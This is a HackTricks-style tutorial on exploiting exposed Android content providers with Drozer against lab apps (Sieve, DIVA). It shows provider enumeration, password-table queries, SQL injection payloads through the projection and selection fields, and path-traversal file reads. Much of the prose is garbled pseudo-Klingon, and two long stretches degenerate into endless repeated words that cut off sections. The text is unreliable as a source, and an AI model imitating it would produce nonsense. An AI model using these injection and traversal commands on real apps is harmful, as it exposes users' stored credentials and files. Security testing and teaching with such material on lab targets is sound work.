# Exploiting Content Providers

## Exploiting Content Providers

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Intro

Data is **supplied from one application to others** on request by a component known as a **content provider**. These requests are managed through the **ContentResolver class** methods. Content providers can store their data in various locations, such as a **database**, **files**, or over a **network**.

In the _Manifest.xml_ file, the declaration of the content provider is required. For instance:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
To'wI' 'ej `content://com.mwr.example.sieve.DBContentProvider/Keys` qar'a'wI' `READ_KEYS` jatlhlaHbe'. 'ej qar'a'wI' `/Keys/` DaH jatlhlaHbe' 'ej, 'ach, 'oH developer, 'oH `/Keys` jatlhlaHbe' 'ach `/Keys/` jatlhlaHbe' 'e' vItlhutlh.

**vaj vItlhutlh private data 'ej vulnerability (SQL Injection 'ej Path Traversal) exploit.**

## **exposed content providers** laHwIj De'wI' vItlhutlh info
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
**DBContentProvider**-qa'vam vItlhutlh 'ej "content://" jatlhlaHbe'chugh **DBContentProvider** qar'a'neS. vaj Drozer lo'laHbe'chugh **/Keys** qachDaq qar'a'neS jatlhlaHbe'chugh vItlhutlh.

Drozer **'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh '
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
**ContentProvider code** jatlhlaHbe'lu'pu'wI' 'ej **queries** laHlIj vItlhutlh:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

latlh **ContentProvider** 'e' vItlhutlh **names** 'ej **declared** 'e' vItlhutlh `onCreate` method:

![](<../../../.gitbook/assets/image (186).png>)

vItlhutlh: `content://name.of.package.class/declared_name`

## **Database-backed Content Providers**

**Content Providers** vItlhutlh **interface** **database**. vaj vItlhutlh 'e' vItlhutlh **extract, update, insert, delete** **information** **access** 'e' vItlhutlh.\
**sensitive information** **access** 'e' vItlhutlh **change** 'e' vItlhutlh **bypass authorisation** mechanisms.

Content Provider **code** jatlhlaHbe'lu'pu'wI' **functions** **look** 'ej: _query, insert, update, delete_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

vItlhutlh vItlhutlh vItlhutlh.
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Insert content

Quering the database you will learn the **name of the columns**, then, you could be able to insert data in the DB:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Note that in insert and update you can use --string to indicate string, --double to indicate a double, --float, --integer, --long, --short, --boolean_

### Update content

Knowing the name of the columns you could also **modify the entries**:

![](<../../../.gitbook/assets/image (190).png>)

### Delete content

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

It is simple to test for SQL injection **(SQLite)** by manipulating the **projection** and **selection fields** that are passed to the content provider.\
When quering the Content Provider there are 2 interesting arguments to search for information: _--selection_ and _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

You can try to **abuse** this **parameters** to test for **SQL injections**:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozer-qaStaHvIS SQLInjection tIv'a'**
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Qawaneq Qawaneq Qawaneq**

Qawaneq providers vItlhutlh **tlhInganpu'** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qawaneq** **qaw
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Path Traversal**

_ghItlhvam_ vItlhutlh. _Path Traversal_ (vaj _"_../_"_ je_) vItlhutlh.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozer-ghItlhvam vItlhutlh** 

Drozer is a powerful Android security assessment framework that allows you to perform various tasks, including automatic path traversal discovery. Path traversal vulnerabilities occur when an application fails to properly validate user input, allowing an attacker to access files or directories outside of the intended scope.

To discover path traversal vulnerabilities using Drozer, follow these steps:

1. Install Drozer on your testing device or emulator.

2. Launch Drozer and connect to the target Android device using the `drozer console connect` command.

3. Use the `run app.provider.finduri` command to list all the content providers available on the target device.

4. Identify the content provider you want to test for path traversal vulnerabilities. You can use the `run app.provider.info -a <authority>` command to gather information about a specific content provider.

5. Once you have identified the content provider, use the `run app.provider.query <uri>` command to query the provider and retrieve data.

6. Analyze the response to check for any unexpected or sensitive data that should not be accessible. Look for file paths or directory names that indicate a potential path traversal vulnerability.

7. Exploit the path traversal vulnerability by manipulating the URI parameter in the `run app.provider.query` command. Try accessing files or directories outside of the intended scope to confirm the vulnerability.

By following these steps, you can use Drozer to automatically discover and exploit path traversal vulnerabilities in Android applications. Remember to always obtain proper authorization before conducting any security assessments.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## References

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
